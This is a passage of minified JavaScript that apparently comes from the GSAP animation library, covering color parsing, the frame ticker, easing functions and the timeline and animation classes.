                      (r = l <= 0.5 ? l * (a + 1) : l + a - l * a)),
                    d.length > 3 && (d[3] *= 1),
                    (d[0] = de(o + 1 / 3, n, r)),
                    (d[1] = de(o, n, r)),
                    (d[2] = de(o - 1 / 3, n, r));
              else d = t.match(L) || fe.transparent;
              d = d.map(Number);
            }
            return (
              e &&
                !f &&
                ((n = d[0] / he),
                (r = d[1] / he),
                (s = d[2] / he),
                (l = ((c = Math.max(n, r, s)) + (u = Math.min(n, r, s))) / 2),
                c === u
                  ? (o = a = 0)
                  : ((h = c - u),
                    (a = l > 0.5 ? h / (2 - c - u) : h / (c + u)),
                    (o =
                      c === n
                        ? (r - s) / h + (r < s ? 6 : 0)
                        : c === r
                        ? (s - n) / h + 2
                        : (n - r) / h + 4),
                    (o *= 60)),
                (d[0] = ~~(o + 0.5)),
                (d[1] = ~~(100 * a + 0.5)),
                (d[2] = ~~(100 * l + 0.5))),
              i && d.length < 4 && (d[3] = 1),
              d
            );
          },
          me = function (t) {
            var e = [],
              i = [],
              n = -1;
            return (
              t.split(ve).forEach(function (t) {
                var r = t.match(R) || [];
                e.push.apply(e, r), i.push((n += r.length + 1));
              }),
              (e.c = i),
              e
            );
          },
          ge = function (t, e, i) {
            var n,
              r,
              s,
              o,
              a = "",
              l = (t + a).match(ve),
              c = e ? "hsla(" : "rgba(",
              u = 0;
            if (!l) return t;
            if (
              ((l = l.map(function (t) {
                return (
                  (t = pe(t, e, 1)) &&
                  c +
                    (e
                      ? t[0] + "," + t[1] + "%," + t[2] + "%," + t[3]
                      : t.join(",")) +
                    ")"
                );
              })),
              i && ((s = me(t)), (n = i.c).join(a) !== s.c.join(a)))
            )
              for (o = (r = t.replace(ve, "1").split(R)).length - 1; u < o; u++)
                a +=
                  r[u] +
                  (~n.indexOf(u)
                    ? l.shift() || c + "0,0,0,0)"
                    : (s.length ? s : l.length ? l : i).shift());
            if (!r)
              for (o = (r = t.split(ve)).length - 1; u < o; u++)
                a += r[u] + l[u];
            return a + r[o];
          },
          ve = (function () {
            var t,
              e =
                "(?:\\b(?:(?:rgb|rgba|hsl|hsla)\\(.+?\\))|\\B#(?:[0-9a-f]{3,4}){1,2}\\b";
            for (t in fe) e += "|" + t + "\\b";
            return new RegExp(e + ")", "gi");
          })(),
          _e = /hsl[a]?\(/,
          ye = function (t) {
            var e,
              i = t.join(" ");
            if (((ve.lastIndex = 0), ve.test(i)))
              return (
                (e = _e.test(i)),
                (t[1] = ge(t[1], e)),
                (t[0] = ge(t[0], e, me(t[1]))),
                !0
              );
          },
          be = (function () {
            var t,
              e,
              i,
              n,
              r,
              s,
              o = Date.now,
              h = 500,
              f = 33,
              p = o(),
              m = p,
              g = 1e3 / 240,
              _ = g,
              y = [],
              b = function i(a) {
                var l,
                  c,
                  u,
                  d,
                  v = o() - m,
                  b = !0 === a;
                if (
                  (v > h && (p += v - f),
                  ((l = (u = (m += v) - p) - _) > 0 || b) &&
                    ((d = ++n.frame),
                    (r = u - 1e3 * n.time),
                    (n.time = u /= 1e3),
                    (_ += l + (l >= g ? 4 : g - l)),
                    (c = 1)),
                  b || (t = e(i)),
                  c)
                )
                  for (s = 0; s < y.length; s++) y[s](u, r, d, a);
              };
            return (n = {
              time: 0,
              frame: 0,
              tick: function () {
                b(!0);
              },
              deltaRatio: function (t) {
                return r / (1e3 / (t || 60));
              },
              wake: function () {
                u &&
                  (!l &&
                    C() &&
                    ((a = l = window),
                    (c = a.document || {}),
                    (Y.gsap = li),
                    (a.gsapVersions || (a.gsapVersions = [])).push(li.version),
                    H(N || a.GreenSockGlobals || (!a.gsap && a) || {}),
                    (i = a.requestAnimationFrame)),
                  t && n.sleep(),
                  (e =
                    i ||
                    function (t) {
                      return setTimeout(t, (_ - 1e3 * n.time + 1) | 0);
                    }),
                  (d = 1),
                  b(2));
              },
              sleep: function () {
                (i ? a.cancelAnimationFrame : clearTimeout)(t),
                  (d = 0),
                  (e = V);
              },
              lagSmoothing: function (t, e) {
                (h = t || 1 / v), (f = Math.min(e, h, 0));
              },
              fps: function (t) {
                (g = 1e3 / (t || 240)), (_ = 1e3 * n.time + g);
              },
              add: function (t) {
                y.indexOf(t) < 0 && y.push(t), we();
              },
              remove: function (t) {
                var e;
                ~(e = y.indexOf(t)) && y.splice(e, 1) && s >= e && s--;
              },
              _listeners: y,
            });
          })(),
          we = function () {
            return !d && be.wake();
          },
          xe = {},
          Te = /^[\d.\-M][\d.\-,\s]/,
          Se = /["']/g,
          ke = function (t) {
            for (
              var e,
                i,
                n,
                r = {},
                s = t.substr(1, t.length - 3).split(":"),
                o = s[0],
                a = 1,
                l = s.length;
              a < l;
              a++
            )
              (i = s[a]),
                (e = a !== l - 1 ? i.lastIndexOf(",") : i.length),
                (n = i.substr(0, e)),
                (r[o] = isNaN(n) ? n.replace(Se, "").trim() : +n),
                (o = i.substr(e + 1).trim());
            return r;
          },
          Oe = function (t) {
            return function (e) {
              return 1 - t(1 - e);
            };
          },
          Ee = function t(e, i) {
            for (var n, r = e._first; r; )
              r instanceof Be
                ? t(r, i)
                : !r.vars.yoyoEase ||
                  (r._yoyo && r._repeat) ||
                  r._yoyo === i ||
                  (r.timeline
                    ? t(r.timeline, i)
                    : ((n = r._ease),
                      (r._ease = r._yEase),
                      (r._yEase = n),
                      (r._yoyo = i))),
                (r = r._next);
          },
          Ae = function (t, e) {
            return (
              (t &&
                (k(t)
                  ? t
                  : xe[t] ||
                    (function (t) {
                      var e = (t + "").split("("),
                        i = xe[e[0]];
                      return i && e.length > 1 && i.config
                        ? i.config.apply(
                            null,
                            ~t.indexOf("{")
                              ? [ke(e[1])]
                              : (function (t) {
                                  var e = t.indexOf("(") + 1,
                                    i = t.indexOf(")"),
                                    n = t.indexOf("(", e);
                                  return t.substring(
                                    e,
                                    ~n && n < i ? t.indexOf(")", i + 1) : i
                                  );
                                })(t)
                                  .split(",")
                                  .map(ut)
                          )
                        : xe._CE && Te.test(t)
                        ? xe._CE("", t)
                        : i;
                    })(t))) ||
              e
            );
          },
          Pe = function (t, e, i, n) {
            void 0 === i &&
              (i = function (t) {
                return 1 - e(1 - t);
              }),
              void 0 === n &&
                (n = function (t) {
                  return t < 0.5 ? e(2 * t) / 2 : 1 - e(2 * (1 - t)) / 2;
                });
            var r,
              s = { easeIn: e, easeOut: i, easeInOut: n };
            return (
              st(t, function (t) {
                for (var e in ((xe[t] = Y[t] = s),
                (xe[(r = t.toLowerCase())] = i),
                s))
                  xe[
                    r +
                      ("easeIn" === e
                        ? ".in"
                        : "easeOut" === e
                        ? ".out"
                        : ".inOut")
                  ] = xe[t + "." + e] = s[e];
              }),
              s
            );
          },
          Ce = function (t) {
            return function (e) {
              return e < 0.5
                ? (1 - t(1 - 2 * e)) / 2
                : 0.5 + t(2 * (e - 0.5)) / 2;
            };
          },
          Me = function t(e, i, n) {
            var r = i >= 1 ? i : 1,
              s = (n || (e ? 0.3 : 0.45)) / (i < 1 ? i : 1),
              o = (s / _) * (Math.asin(1 / r) || 0),
              a = function (t) {
                return 1 === t
                  ? 1
                  : r * Math.pow(2, -10 * t) * T((t - o) * s) + 1;
              },
              l =
                "out" === e
                  ? a
                  : "in" === e
                  ? function (t) {
                      return 1 - a(1 - t);
                    }
                  : Ce(a);
            return (
              (s = _ / s),
              (l.config = function (i, n) {
                return t(e, i, n);
              }),
              l
            );
          },
          je = function t(e, i) {
            void 0 === i && (i = 1.70158);
            var n = function (t) {
                return t ? --t * t * ((i + 1) * t + i) + 1 : 0;
              },
              r =
                "out" === e
                  ? n
                  : "in" === e
                  ? function (t) {
                      return 1 - n(1 - t);
                    }
                  : Ce(n);
            return (
              (r.config = function (i) {
                return t(e, i);
              }),
              r
            );
          };
        (i._ticker = be),
          (i._colorStringFilter = ye),
          (i._colorExp = ve),
          (i.splitColor = pe),
          (i.interpolate = oe),
          (i.mapRange = se),
          (i._replaceRandom = re),
          (i.wrapYoyo = ne),
          (i.wrap = ie),
          (i.normalize = te),
          (i.unitize = Jt),
          (i.pipe = $t),
          (i.random = Zt),
          (i.snap = Qt),
          (i._roundModifier = Kt),
          (i.distribute = Gt),
          (i.shuffle = Vt),
          (i.selector = qt),
          (i.toArray = Ut),
          (i.clamp = Nt),
          (i.getUnit = Yt),
          (i._removeLinkedListItem = _t),
          (i._setDefaults = ft),
          (i._round = ot),
          (i._forEachName = st),
          (i._getProperty = rt),
          (i._getCache = nt),
          (i._plugins = Z),
          (i._missingPlugin = X),
          (i._relExp = z),
          (i._numWithUnitExp = R),
          (i._numExp = B),
          (i._isUndefined = E),
          (i._isString = S),
          (i._config = p),
          st("Linear,Quad,Cubic,Quart,Quint,Strong", function (t, e) {
            var i = e < 5 ? e + 1 : e;
            Pe(
              t + ",Power" + (i - 1),
              e
                ? function (t) {
                    return Math.pow(t, i);
                  }
                : function (t) {
                    return t;
                  },
              function (t) {
                return 1 - Math.pow(1 - t, i);
              },
              function (t) {
                return t < 0.5
                  ? Math.pow(2 * t, i) / 2
                  : 1 - Math.pow(2 * (1 - t), i) / 2;
              }
            );
          }),
          (xe.Linear.easeNone = xe.none = xe.Linear.easeIn),
          Pe("Elastic", Me("in"), Me("out"), Me()),
          (function (t, e) {
            var i = function (i) {
              return i < 0.36363636363636365
                ? t * i * i
                : i < 0.7272727272727273
                ? t * Math.pow(i - 1.5 / e, 2) + 0.75
                : i < 0.9090909090909092
                ? t * (i -= 2.25 / e) * i + 0.9375
                : t * Math.pow(i - 2.625 / e, 2) + 0.984375;
            };
            Pe(
              "Bounce",
              function (t) {
                return 1 - i(1 - t);
              },
              i
            );
          })(7.5625, 2.75),
          Pe("Expo", function (t) {
            return t ? Math.pow(2, 10 * (t - 1)) : 0;
          }),
          Pe("Circ", function (t) {
            return -(w(1 - t * t) - 1);
          }),
          Pe("Sine", function (t) {
            return 1 === t ? 1 : 1 - x(t * y);
          }),
          Pe("Back", je("in"), je("out"), je()),
          (xe.SteppedEase =
            xe.steps =
            Y.SteppedEase =
              {
                config: function (t, e) {
                  void 0 === t && (t = 1);
                  var i = 1 / t,
                    n = t + (e ? 0 : 1),
                    r = e ? 1 : 0;
                  return function (t) {
                    return (((n * Wt(0, 0.99999999, t)) | 0) + r) * i;
                  };
                },
              }),
          (m.ease = xe["quad.out"]),
          st(
            "onComplete,onUpdate,onStart,onRepeat,onReverseComplete,onInterrupt",
            function (t) {
              return (et += t + "," + t + "Params,");
            }
          );
        var De = function (t, e) {
          (this.id = b++),
            (t._gsap = this),
            (this.target = t),
            (this.harness = e),
            (this.get = e ? e.get : rt),
            (this.set = e ? e.getSetter : Ke);
        };
        i.GSCache = De;
        var Le = (function () {
          function t(t) {
            (this.vars = t),
              (this._delay = +t.delay || 0),
              (this._repeat = t.repeat === 1 / 0 ? -2 : t.repeat || 0) &&
                ((this._rDelay = t.repeatDelay || 0),
                (this._yoyo = !!t.yoyo || !!t.yoyoEase)),
              (this._ts = 1),
              Lt(this, +t.duration, 1, 1),
              (this.data = t.data),
              d || be.wake();
          }
          var e = t.prototype;
          return (
            (e.delay = function (t) {
              return t || 0 === t
                ? (this.parent &&
                    this.parent.smoothChildTiming &&
                    this.startTime(this._start + t - this._delay),
                  (this._delay = t),
                  this)
                : this._delay;
            }),
            (e.duration = function (t) {
              return arguments.length
                ? this.totalDuration(
                    this._repeat > 0 ? t + (t + this._rDelay) * this._repeat : t
                  )
                : this.totalDuration() && this._dur;
            }),
            (e.totalDuration = function (t) {
              return arguments.length
                ? ((this._dirty = 0),
                  Lt(
                    this,
                    this._repeat < 0
                      ? t
                      : (t - this._repeat * this._rDelay) / (this._repeat + 1)
                  ))
                : this._tDur;
            }),
            (e.totalTime = function (t, e) {
              if ((we(), !arguments.length)) return this._tTime;
              var i = this._dp;
              if (i && i.smoothChildTiming && this._ts) {
                for (Et(this, t), !i._dp || i.parent || At(i, this); i.parent; )
                  i.parent._time !==
                    i._start +
                      (i._ts >= 0
                        ? i._tTime / i._ts
                        : (i.totalDuration() - i._tTime) / -i._ts) &&
                    i.totalTime(i._tTime, !0),
                    (i = i.parent);
                !this.parent &&
                  this._dp.autoRemoveChildren &&
                  ((this._ts > 0 && t < this._tDur) ||
                    (this._ts < 0 && t > 0) ||
                    (!this._tDur && !t)) &&
                  Pt(this._dp, this, this._start - this._delay);
              }
              return (
                (this._tTime !== t ||
                  (!this._dur && !e) ||
                  (this._initted && Math.abs(this._zTime) === v) ||
                  (!t && !this._initted && (this.add || this._ptLookup))) &&
                  (this._ts || (this._pTime = t), ct(this, t, e)),
                this
              );
            }),
            (e.time = function (t, e) {
              return arguments.length
                ? this.totalTime(
                    Math.min(this.totalDuration(), t + Tt(this)) % this._dur ||
                      (t ? this._dur : 0),
                    e
                  )
                : this._time;
            }),
            (e.totalProgress = function (t, e) {
              return arguments.length
                ? this.totalTime(this.totalDuration() * t, e)
                : this.totalDuration()
                ? Math.min(1, this._tTime / this._tDur)
                : this.ratio;
            }),
            (e.progress = function (t, e) {
              return arguments.length
                ? this.totalTime(
                    this.duration() *
                      (!this._yoyo || 1 & this.iteration() ? t : 1 - t) +
                      Tt(this),
                    e
                  )
                : this.duration()
                ? Math.min(1, this._time / this._dur)
                : this.ratio;
            }),
            (e.iteration = function (t, e) {
              var i = this.duration() + this._rDelay;
              return arguments.length
                ? this.totalTime(this._time + (t - 1) * i, e)
                : this._repeat
                ? St(this._tTime, i) + 1
                : 1;
            }),
            (e.timeScale = function (t) {
              if (!arguments.length) return this._rts === -v ? 0 : this._rts;
              if (this._rts === t) return this;
              var e =
                this.parent && this._ts
                  ? kt(this.parent._time, this)
                  : this._tTime;
              return (
                (this._rts = +t || 0),
                (this._ts = this._ps || t === -v ? 0 : this._rts),
                wt(this.totalTime(Wt(-this._delay, this._tDur, e), !0))
              );
            }),
            (e.paused = function (t) {
              return arguments.length
                ? (this._ps !== t &&
                    ((this._ps = t),
                    t
                      ? ((this._pTime =
                          this._tTime ||
                          Math.max(-this._delay, this.rawTime())),
                        (this._ts = this._act = 0))
                      : (we(),
                        (this._ts = this._rts),
                        this.totalTime(
                          this.parent && !this.parent.smoothChildTiming
                            ? this.rawTime()
                            : this._tTime || this._pTime,
                          1 === this.progress() &&
                            (this._tTime -= v) &&
                            Math.abs(this._zTime) !== v
                        ))),
                  this)
                : this._ps;
            }),
            (e.startTime = function (t) {
              if (arguments.length) {
                this._start = t;
                var e = this.parent || this._dp;
                return (
                  e &&
                    (e._sort || !this.parent) &&
                    Pt(e, this, t - this._delay),
                  this
                );
              }
              return this._start;
            }),
            (e.endTime = function (t) {
              return (
                this._start +
                (P(t) ? this.totalDuration() : this.duration()) /
                  Math.abs(this._ts)
              );
            }),
            (e.rawTime = function (t) {
              var e = this.parent || this._dp;
              return e
                ? t &&
                  (!this._ts ||
                    (this._repeat && this._time && this.totalProgress() < 1))
                  ? this._tTime % (this._dur + this._rDelay)
                  : this._ts
                  ? kt(e.rawTime(t), this)
                  : this._tTime
                : this._tTime;
            }),
            (e.globalTime = function (t) {
              for (var e = this, i = arguments.length ? t : e.rawTime(); e; )
                (i = e._start + i / (e._ts || 1)), (e = e._dp);
              return i;
            }),
            (e.repeat = function (t) {
              return arguments.length
                ? ((this._repeat = t === 1 / 0 ? -2 : t), Bt(this))
                : -2 === this._repeat
                ? 1 / 0
                : this._repeat;
            }),
            (e.repeatDelay = function (t) {
              return arguments.length
                ? ((this._rDelay = t), Bt(this))
                : this._rDelay;
            }),
            (e.yoyo = function (t) {
              return arguments.length ? ((this._yoyo = t), this) : this._yoyo;
            }),
            (e.seek = function (t, e) {
              return this.totalTime(It(this, t), P(e));
            }),
            (e.restart = function (t, e) {
              return this.play().totalTime(t ? -this._delay : 0, P(e));
            }),
            (e.play = function (t, e) {
              return null != t && this.seek(t, e), this.reversed(!1).paused(!1);
            }),
            (e.reverse = function (t, e) {
              return (
                null != t && this.seek(t || this.totalDuration(), e),
                this.reversed(!0).paused(!1)
              );
            }),
            (e.pause = function (t, e) {
              return null != t && this.seek(t, e), this.paused(!0);
            }),
            (e.resume = function () {
              return this.paused(!1);
            }),
            (e.reversed = function (t) {
              return arguments.length
                ? (!!t !== this.reversed() &&
                    this.timeScale(-this._rts || (t ? -v : 0)),
                  this)
                : this._rts < 0;
            }),
            (e.invalidate = function () {
              return (this._initted = this._act = 0), (this._zTime = -v), this;
            }),
            (e.isActive = function () {
              var t,
                e = this.parent || this._dp,
                i = this._start;
              return !(
                e &&
                !(
                  this._ts &&
                  this._initted &&
                  e.isActive() &&
                  (t = e.rawTime(!0)) >= i &&
                  t < this.endTime(!0) - v
                )
              );
            }),
            (e.eventCallback = function (t, e, i) {
              var n = this.vars;
              return arguments.length > 1
                ? (e
                    ? ((n[t] = e),
                      i && (n[t + "Params"] = i),
                      "onUpdate" === t && (this._onUpdate = e))
                    : delete n[t],
                  this)
                : n[t];
            }),
            (e.then = function (t) {
              var e = this;
              return new Promise(function (i) {
                var n = k(t) ? t : ht,
                  r = function () {
                    var t = e.then;
                    (e.then = null),
                      k(n) && (n = n(e)) && (n.then || n === e) && (e.then = t),
                      i(n),
                      (e.then = t);
                  };
                (e._initted && 1 === e.totalProgress() && e._ts >= 0) ||
                (!e._tTime && e._ts < 0)
                  ? r()
                  : (e._prom = r);
              });
            }),
            (e.kill = function () {
              ce(this);
            }),
            t
          );
        })();
        (i.Animation = Le),
          ft(Le.prototype, {
            _time: 0,
            _start: 0,
            _end: 0,
            _tTime: 0,
            _tDur: 0,
            _dirty: 0,
            _repeat: 0,
            _yoyo: !1,
            parent: null,
            _initted: !1,
            _rDelay: 0,
            _ts: 1,
            _dp: 0,
            ratio: 0,
            _zTime: -v,
            _prom: 0,
            _ps: !1,
            _rts: 1,
          });
        var Be = (function (t) {
          function e(e, i) {
            var r;
            return (
              void 0 === e && (e = {}),
              ((r = t.call(this, e) || this).labels = {}),
              (r.smoothChildTiming = !!e.smoothChildTiming),
              (r.autoRemoveChildren = !!e.autoRemoveChildren),
              (r._sort = P(e.sortChildren)),
              o && Pt(e.parent || o, n(r), i),
              e.reversed && r.reverse(),
              e.paused && r.paused(!0),
              e.scrollTrigger && Ct(n(r), e.scrollTrigger),
              r
            );
          }
          r(e, t);
          var i = e.prototype;
          return (
            (i.to = function (t, e, i) {
              return zt(0, arguments, this), this;
            }),
            (i.from = function (t, e, i) {
              return zt(1, arguments, this), this;
            }),
            (i.fromTo = function (t, e, i, n) {
              return zt(2, arguments, this), this;
            }),
            (i.set = function (t, e, i) {
              return (
                (e.duration = 0),
                (e.parent = this),
                vt(e).repeatDelay || (e.repeat = 0),
                (e.immediateRender = !!e.immediateRender),
                new Xe(t, e, It(this, i), 1),
                this
              );
            }),
            (i.call = function (t, e, i) {
              return Pt(this, Xe.delayedCall(0, t, e), i);
            }),
            (i.staggerTo = function (t, e, i, n, r, s, o) {
              return (
                (i.duration = e),
                (i.stagger = i.stagger || n),
                (i.onComplete = s),
                (i.onCompleteParams = o),
                (i.parent = this),
                new Xe(t, i, It(this, r)),
                this
              );
            }),
            (i.staggerFrom = function (t, e, i, n, r, s, o) {
              return (
                (i.runBackwards = 1),
                (vt(i).immediateRender = P(i.immediateRender)),
                this.staggerTo(t, e, i, n, r, s, o)
              );
            }),
            (i.staggerFromTo = function (t, e, i, n, r, s, o, a) {
              return (
                (n.startAt = i),
                (vt(n).immediateRender = P(n.immediateRender)),
                this.staggerTo(t, e, n, r, s, o, a)
              );
            }),
            (i.render = function (t, e, i) {
              var n,
                r,
                s,
                a,
                l,
                c,
                u,
                h,
                f,
                d,
                p,
                m,
                g = this._time,
                _ = this._dirty ? this.totalDuration() : this._tDur,
                y = this._dur,
                b = this !== o && t > _ - v && t >= 0 ? _ : t < v ? 0 : t,
                w = this._zTime < 0 != t < 0 && (this._initted || !y);
              if (b !== this._tTime || i || w) {
                if (
                  (g !== this._time &&
                    y &&
                    ((b += this._time - g), (t += this._time - g)),
                  (n = b),
                  (f = this._start),
                  (c = !(h = this._ts)),
                  w && (y || (g = this._zTime), (t || !e) && (this._zTime = t)),
                  this._repeat)
                ) {
                  if (
                    ((p = this._yoyo),
                    (l = y + this._rDelay),
                    this._repeat < -1 && t < 0)
                  )
                    return this.totalTime(100 * l + t, e, i);
                  if (
                    ((n = ot(b % l)),
                    b === _
                      ? ((a = this._repeat), (n = y))
                      : ((a = ~~(b / l)) && a === b / l && ((n = y), a--),
                        n > y && (n = y)),
                    (d = St(this._tTime, l)),
                    !g && this._tTime && d !== a && (d = a),
                    p && 1 & a && ((n = y - n), (m = 1)),
                    a !== d && !this._lock)
                  ) {
                    var x = p && 1 & d,
                      T = x === (p && 1 & a);
                    if (
                      (a < d && (x = !x),
                      (g = x ? 0 : y),
                      (this._lock = 1),
                      (this.render(g || (m ? 0 : ot(a * l)), e, !y)._lock = 0),
                      (this._tTime = b),
                      !e && this.parent && le(this, "onRepeat"),
                      this.vars.repeatRefresh &&
                        !m &&
                        (this.invalidate()._lock = 1),
                      (g && g !== this._time) ||
                        c !== !this._ts ||
                        (this.vars.onRepeat && !this.parent && !this._act))
                    )
                      return this;
                    if (
                      ((y = this._dur),
                      (_ = this._tDur),
                      T &&
                        ((this._lock = 2),
                        (g = x ? y : -1e-4),
                        this.render(g, !0),
                        this.vars.repeatRefresh && !m && this.invalidate()),
                      (this._lock = 0),
                      !this._ts && !c)
                    )
                      return this;
                    Ee(this, m);
                  }
                }
                if (
                  (this._hasPause &&
                    !this._forcing &&
                    this._lock < 2 &&
                    (u = (function (t, e, i) {
                      var n;
                      if (i > e)
                        for (n = t._first; n && n._start <= i; ) {
                          if (!n._dur && "isPause" === n.data && n._start > e)
                            return n;
                          n = n._next;
                        }
                      else
                        for (n = t._last; n && n._start >= i; ) {
                          if (!n._dur && "isPause" === n.data && n._start < e)
                            return n;
                          n = n._prev;
                        }
                    })(this, ot(g), ot(n))) &&
                    (b -= n - (n = u._start)),
                  (this._tTime = b),
                  (this._time = n),
                  (this._act = !h),
                  this._initted ||
                    ((this._onUpdate = this.vars.onUpdate),
                    (this._initted = 1),
                    (this._zTime = t),
                    (g = 0)),
                  !g && n && !e && (le(this, "onStart"), this._tTime !== b))
                )
                  return this;
                if (n >= g && t >= 0)
                  for (r = this._first; r; ) {
                    if (
                      ((s = r._next),
                      (r._act || n >= r._start) && r._ts && u !== r)
                    ) {
                      if (r.parent !== this) return this.render(t, e, i);
                      if (
                        (r.render(
                          r._ts > 0
                            ? (n - r._start) * r._ts
                            : (r._dirty ? r.totalDuration() : r._tDur) +
                                (n - r._start) * r._ts,
                          e,
                          i
                        ),
                        n !== this._time || (!this._ts && !c))
                      ) {
                        (u = 0), s && (b += this._zTime = -v);
                        break;
                      }
                    }
                    r = s;
                  }
                else {
                  r = this._last;
                  for (var S = t < 0 ? t : n; r; ) {
                    if (
                      ((s = r._prev),
                      (r._act || S <= r._end) && r._ts && u !== r)
                    ) {
                      if (r.parent !== this) return this.render(t, e, i);
                      if (
                        (r.render(
                          r._ts > 0
                            ? (S - r._start) * r._ts
                            : (r._dirty ? r.totalDuration() : r._tDur) +
                                (S - r._start) * r._ts,
                          e,
                          i
                        ),
                        n !== this._time || (!this._ts && !c))
                      ) {
                        (u = 0), s && (b += this._zTime = S ? -v : v);
                        break;
                      }
                    }
                    r = s;
                  }
                }
                if (
                  u &&
                  !e &&
                  (this.pause(),
                  (u.render(n >= g ? 0 : -v)._zTime = n >= g ? 1 : -1),
                  this._ts)
                )
                  return (this._start = f), Ot(this), this.render(t, e, i);
                this._onUpdate && !e && le(this, "onUpdate", !0),
                  ((b === _ && _ >= this.totalDuration()) || (!b && g)) &&
                    ((f !== this._start &&
                      Math.abs(h) === Math.abs(this._ts)) ||
                      this._lock ||
                      ((t || !y) &&
                        ((b === _ && this._ts > 0) || (!b && this._ts < 0)) &&
                        yt(this, 1),
                      e ||
                        (t < 0 && !g) ||
                        (!b && !g && _) ||
                        (le(
                          this,
                          b === _ && t >= 0
                            ? "onComplete"
                            : "onReverseComplete",
                          !0
                        ),
                        this._prom &&
                          !(b < _ && this.timeScale() > 0) &&
                          this._prom())));
              }
              return this;
            }),
            (i.add = function (t, e) {
              var i = this;
              if ((O(e) || (e = It(this, e, t)), !(t instanceof Le))) {
                if (D(t))
                  return (
                    t.forEach(function (t) {
                      return i.add(t, e);
                    }),
                    this
                  );
                if (S(t)) return this.addLabel(t, e);
                if (!k(t)) return this;
                t = Xe.delayedCall(0, t);
              }
              return this !== t ? Pt(this, t, e) : this;
            }),
            (i.getChildren = function (t, e, i, n) {
              void 0 === t && (t = !0),
                void 0 === e && (e = !0),
                void 0 === i && (i = !0),
                void 0 === n && (n = -g);
              for (var r = [], s = this._first; s; )
                s._start >= n &&
                  (s instanceof Xe
                    ? e && r.push(s)
                    : (i && r.push(s),
                      t && r.push.apply(r, s.getChildren(!0, e, i)))),
                  (s = s._next);
              return r;
            }),
            (i.getById = function (t) {
              for (var e = this.getChildren(1, 1, 1), i = e.length; i--; )
                if (e[i].vars.id === t) return e[i];
            }),
            (i.remove = function (t) {
              return S(t)
                ? this.removeLabel(t)
                : k(t)
                ? this.killTweensOf(t)
                : (_t(this, t),
                  t === this._recent && (this._recent = this._last),
                  bt(this));
            }),
            (i.totalTime = function (e, i) {
              return arguments.length
                ? ((this._forcing = 1),
                  !this._dp &&
                    this._ts &&
                    (this._start = ot(
                      be.time -
                        (this._ts > 0
                          ? e / this._ts
                          : (this.totalDuration() - e) / -this._ts)
                    )),
                  t.prototype.totalTime.call(this, e, i),
                  (this._forcing = 0),
                  this)
                : this._tTime;
            }),
            (i.addLabel = function (t, e) {
              return (this.labels[t] = It(this, e)), this;
            }),
            (i.removeLabel = function (t) {
              return delete this.labels[t], this;
            }),
            (i.addPause = function (t, e, i) {
              var n = Xe.delayedCall(0, e || V, i);
              return (
                (n.data = "isPause"),
                (this._hasPause = 1),
                Pt(this, n, It(this, t))
              );
            }),
            (i.removePause = function (t) {
              var e = this._first;
              for (t = It(this, t); e; )
                e._start === t && "isPause" === e.data && yt(e), (e = e._next);
            }),
            (i.killTweensOf = function (t, e, i) {
              for (var n = this.getTweensOf(t, i), r = n.length; r--; )
                Re !== n[r] && n[r].kill(t, e);
              return this;
            }),
            (i.getTweensOf = function (t, e) {
              for (var i, n = [], r = Ut(t), s = this._first, o = O(e); s; )
                s instanceof Xe
                  ? at(s._targets, r) &&
                    (o
                      ? (!Re || (s._initted && s._ts)) &&
                        s.globalTime(0) <= e &&
                        s.globalTime(s.totalDuration()) > e
                      : !e || s.isActive()) &&
                    n.push(s)
                  : (i = s.getTweensOf(r, e)).length && n.push.apply(n, i),
                  (s = s._next);
              return n;
            }),
            (i.tweenTo = function (t, e) {
              e = e || {};
              var i,
                n = this,
                r = It(n, t),
                s = e,
                o = s.startAt,
                a = s.onStart,
                l = s.onStartParams,
                c = s.immediateRender,
                u = Xe.to(
                  n,
                  ft(
                    {
                      ease: e.ease || "none",
                      lazy: !1,
                      immediateRender: !1,
                      time: r,
                      overwrite: "auto",
                      duration:
                        e.duration ||
                        Math.abs(
                          (r - (o && "time" in o ? o.time : n._time)) /
                            n.timeScale()
                        ) ||
                        v,
                      onStart: function () {
                        if ((n.pause(), !i)) {
                          var t =
                            e.duration ||
                            Math.abs(
                              (r - (o && "time" in o ? o.time : n._time)) /
                                n.timeScale()
                            );
                          u._dur !== t &&
                            Lt(u, t, 0, 1).render(u._time, !0, !0),
                            (i = 1);
                        }
                        a && a.apply(u, l || []);
                      },
                    },
                    e
                  )
                );
              return c ? u.render(0) : u;
            }),
            (i.tweenFromTo = function (t, e, i) {
              return this.tweenTo(e, ft({ startAt: { time: It(this, t) } }, i));
            }),
            (i.recent = function () {
              return this._recent;
            }),
            (i.nextLabel = function (t) {
              return void 0 === t && (t = this._time), ae(this, It(this, t));
            }),
            (i.previousLabel = function (t) {
              return void 0 === t && (t = this._time), ae(this, It(this, t), 1);
            }),
            (i.currentLabel = function (t) {
              return arguments.length
                ? this.seek(t, !0)
                : this.previousLabel(this._time + v);
            }),
            (i.shiftChildren = function (t, e, i) {
              void 0 === i && (i = 0);
              for (var n, r = this._first, s = this.labels; r; )
                r._start >= i && ((r._start += t), (r._end += t)),
                  (r = r._next);
              if (e) for (n in s) s[n] >= i && (s[n] += t);
              return bt(this);
            }),
            (i.invalidate = function () {
              var e = this._first;
              for (this._lock = 0; e; ) e.invalidate(), (e = e._next);
              return t.prototype.invalidate.call(this);
            }),
            (i.clear = function (t) {
              void 0 === t && (t = !0);
              for (var e, i = this._first; i; )
                (e = i._next), this.remove(i), (i = e);
              return (
                this._dp && (this._time = this._tTime = this._pTime = 0),
                t && (this.labels = {}),
                bt(this)
              );
            }),
            (i.totalDuration = function (t) {
              var e,
                i,
                n,
                r = 0,
                s = this._last,
                a = g;
              if (arguments.length)
                return this.timeScale(
                  (this._repeat < 0 ? this.duration() : this.totalDuration()) /
                    (this.reversed() ? -t : t)
                );
              if (this._dirty) {
                for (n = this.parent; s; )
                  (e = s._prev),
                    s._dirty && s.totalDuration(),
                    (i = s._start) > a && this._sort && s._ts && !this._lock
                      ? ((this._lock = 1),
                        (Pt(this, s, i - s._delay, 1)._lock = 0))
                      : (a = i),
                    i < 0 &&
                      s._ts &&
                      ((r -= i),
                      ((!n && !this._dp) || (n && n.smoothChildTiming)) &&
                        ((this._start += i / this._ts),
                        (this._time -= i),
                        (this._tTime -= i)),
                      this.shiftChildren(-i, !1, -1 / 0),
                      (a = 0)),
                    s._end > r && s._ts && (r = s._end),
                    (s = e);
                Lt(this, this === o && this._time > r ? this._time : r, 1, 1),
                  (this._dirty = 0);
              }
              return this._tDur;
            }),
            (e.updateRoot = function (t) {
              if ((o._ts && (ct(o, kt(t, o)), (h = be.frame)), be.frame >= J)) {
